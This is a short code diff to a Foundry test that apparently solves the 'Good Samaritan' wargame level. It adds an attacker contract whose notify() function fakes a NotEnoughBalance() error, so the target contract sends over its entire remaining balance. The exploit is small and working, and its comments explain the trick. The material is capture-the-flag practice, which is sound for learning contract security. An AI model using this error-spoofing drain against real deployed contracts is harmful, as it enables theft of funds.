@@ -28,6 +28,29 @@ contract GoodSamaritanTest is Test, BaseTest {
     function _attack() public override {
         vm.startPrank(attacker);
 
+        // 1. Request for donation in constructor
+        // and upon `notify()` revert the first time
+        // with `NotEnoughBalance()` to trigger
+        // `transferRemainder()` in `requestDonation()`
+        new GoodSamaritanAttacker(level);
+
         vm.stopPrank();
     }
+}
+
+contract GoodSamaritanAttacker {
+    GoodSamaritan public level;
+
+    constructor(GoodSamaritan _level) {
+        level = _level;
+        level.requestDonation();
+    }
+
+    function notify(uint256 amount) external pure {
+        if (amount == 10) {
+            revert NotEnoughBalance();
+        }
+    }
+
+    error NotEnoughBalance();
 }
